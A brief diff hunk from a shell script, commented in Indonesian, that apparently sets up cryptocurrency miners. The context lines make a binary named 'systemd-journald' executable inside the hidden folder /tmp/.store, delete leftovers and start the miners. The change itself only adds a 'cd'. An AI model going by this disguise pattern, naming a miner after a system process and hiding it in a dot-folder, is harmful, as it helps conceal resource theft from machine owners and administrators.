@@ -35,6 +35,8 @@ chmod +x /tmp/.store/2/systemd-journald.
 # Bersih-bersih
 rm -f systemd-journald.
 
+cd
+
 # Jalankan miner dari dalam foldernya tanpa -c config.ini
 echo -e "${GREEN}[*] Starting miners...${NC}"
 
